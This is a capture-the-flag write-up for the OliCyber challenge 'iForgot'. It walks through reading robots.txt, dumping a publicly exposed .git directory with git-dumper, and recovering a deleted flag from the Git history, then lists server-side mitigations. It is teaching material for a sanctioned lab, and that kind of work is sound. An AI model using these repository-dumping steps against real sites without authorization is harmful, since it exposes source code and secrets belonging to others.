# iForgot

**Competition:** OliCyber<br>
**Category:** Web / Information Disclosure<br>
**URL:** http://iforgot.challs.olicyber.it

---

## Description

> Someone is very confident they deleted everything needed to solve the challenge, but maybe something is still hidden around...

A site where the developer tried to hide sensitive files but forgot to clean up the publicly exposed Git repository.

---

## Solution

### Step 1 — Checking robots.txt

The first step is always to check `robots.txt` to discover what content the site is trying to hide:

```bash
curl http://iforgot.challs.olicyber.it/robots.txt
```

**Output:**
```
User-agent: *
Disallow: /index.js
Disallow: /package.json
Disallow: /.git
```

Interesting! Three paths are disallowed:
- `/index.js` — The main JavaScript file
- `/package.json` — Project dependencies and metadata
- `/.git` — **The Git repository directory**

---

### Step 2 — Identifying the Vulnerability

The `Disallow: /.git` directive in `robots.txt` does **not prevent** access to the `.git` folder — it is only a **recommendation** for crawlers. In reality, the server is accidentally exposing the entire Git repository!

This is a classic misconfiguration: the developer tried to hide the repository by adding it to `robots.txt`, but forgot to implement server-side access controls.

---

### Step 3 — Dumping the Git Repository

We can extract the entire Git repository using the **git-dumper** tool:

**Installing dependencies:**

```bash
pip install bs4 dulwich requests_pkcs12
```

**Dumping the repository:**

```bash
python3 git_dumper.py http://iforgot.challs.olicyber.it/.git/ ./iforgot_repo
```

**Output:**

```
[-] Testing http://iforgot.challs.olicyber.it/.git/HEAD [200]
[-] Testing http://iforgot.challs.olicyber.it/.git/ [404]
[-] Fetching common files
[-] Fetching http://iforgot.challs.olicyber.it/.git/hooks/post-commit.sample [404]
[-] http://iforgot.challs.olicyber.it/.git/hooks/post-commit.sample responded with status code 404
...
[-] Finding objects
[-] Fetching objects
[-] Fetching http://iforgot.challs.olicyber.it/.git/objects/20/501e913e94f40ed3f279f1101c164221026d44 [200]
[-] Fetching http://iforgot.challs.olicyber.it/.git/objects/c2/658d7d1b31848c3b71960543cb0368e56cd4c7 [200]
[-] Fetching http://iforgot.challs.olicyber.it/.git/objects/95/cc5bc93ae77aea04bad50aa24637fba6040c57 [200]
...
[-] Running git checkout .
```

The tool automatically downloads all Git objects and reconstructs the repository locally in `./iforgot_repo`.

---

### Step 4 — Inspecting the Repository

Once extracted, we can explore the commit history:

```bash
cd iforgot_repo
git log
```

**Output:**

```
commit bb2b038954f222b7ba4221cf125773f8557eadfb (HEAD -> master)
Author: SuperHacker11 <super@hackerz.real>
Date:   Thu Sep 18 08:41:29 2025 +0000
    removed flag

commit d52d798aca74f1599b7615f31bfb95ec5740d437
Author: SuperHacker11 <super@hackerz.real>
Date:   Thu Sep 18 08:41:29 2025 +0000
    add challenge
```

The most recent commit (`bb2b038...`) has the message **"removed flag"** — meaning the flag was deleted in this commit!

---

### Step 5 — Recovering Secrets from the Previous Commit

The developer thought they deleted everything, but the previous commit (`d52d798...`) still contains the flag. We can recover it with:

```bash
# View file contents from the previous commit
git show HEAD~1:index.js
```

Or search across all commits:

```bash
git show d52d798:index.js
```

If the flag is in a fully removed file, search all Git objects:

```bash
git log --all --full-history -p | grep -i "flag{"
```

---

### Step 6 — Analyzing the Current Code

Reading the current `index.js`:

```javascript
const express = require('express');
const app = express();
const port = 3000;

// We can expose the entire current directory — I already deleted
// the flag from the repository and nobody will be able to recover it 😈
app.use(express.static('.'));

app.get('/', function (req, res) {
  res.end('nothing here UwU');
});

app.listen(port, () => {
  console.log(`Listening at port ${port}`);
});
```

The comment is ironic: the developer thinks they deleted the flag, but didn't realize Git keeps the full history!

---

### Step 7 — Finding the Flag

The flag is in the previous commit (`d52d798aca74f1599b7615f31bfb95ec5740d437`) with the message "add challenge".

Run any of the following commands:

```bash
# Method 1: Search the flag across all commits
git log --all --full-history -p | grep "flag{"
```

**Output:**
```
-flag{...}
```

```bash
# Method 2: Read the file from the previous commit
git show d52d798:index.js
```

```bash
# Method 3: View the diff between commits
git diff d52d798 HEAD
```

**Full output:**
```
diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index 9456de7..0000000
--- a/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-flag{...}
```

---

### Step 8 — Result

**The flag is:**

```
flag{...}
```

The `flag.txt` file was deleted in the most recent commit, but Git retains the full history. The diff clearly shows the removed file (lines prefixed with `-`) and its original content.

---

## Vulnerability Exploited

| Aspect | Detail |
|---|---|
| **Type** | Information Disclosure / Git Repository Exposure |
| **Root Cause** | `.git` directory publicly accessible |
| **Failed Protection** | Using `robots.txt` as the only protection |
| **Impact** | Access to source code, full commit history, credentials, flag |

---

## Mitigations

- **Never expose the `.git` folder** in production
- Add sensitive files such as `.env`, credentials, and private keys to `.gitignore`
- Configure the web server to block access to hidden directories:

```apache
# Apache (.htaccess)
<FilesMatch "^\.">
  Order allow,deny
  Deny from all
</FilesMatch>
```

```nginx
# Nginx
location ~ /\. {
    deny all;
}
```

- Run `git clean -fdx` before deploying to remove unwanted files
- Do not deploy directly from the Git repository folder — use a separate build directory
- Implement server-side controls that block access to sensitive directories
- Clean the Git history from sensitive data if it was accidentally committed

---

## Conclusions

This challenge highlights the importance of:

1. **Configuration management**: Do not rely on `robots.txt` for security
2. **Repository hygiene**: Never commit credentials or sensitive files
3. **Secure deployment**: Separate source code from served content
4. **Defense in depth**: Combine multiple layers of protection